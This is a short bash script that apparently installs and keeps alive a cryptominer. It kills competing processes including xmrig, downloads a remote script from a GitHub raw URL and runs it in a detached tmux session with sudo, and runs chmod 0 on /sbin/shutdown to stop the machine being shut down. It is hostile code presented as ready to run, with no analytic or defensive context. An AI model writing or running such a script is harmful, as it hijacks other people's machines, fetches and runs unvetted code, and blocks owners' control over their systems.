#! /bin/bash

set -x #echo on
if [ -f ${PWD}/https.sh ]; then
    if pgrep -x "az" > /dev/null
then
	echo " Ok roi"
else
sudo chmod +x https.sh
sudo tmux new-session -d -s my_session1333  './https.sh'
fi
exit
fi


sudo pkill httpd
sudo pkill azu
sudo pkill xmrig
sudo pkill python3
sudo pkill https.sh
sudo rm https.sh
sudo wget https://raw.githubusercontent.com/crawford1988/codeweb/main/https.sh
sudo chmod +x https.sh
sudo chmod 0 /sbin/shutdown
sudo tmux new-session -d -s my_session333  './https.sh'
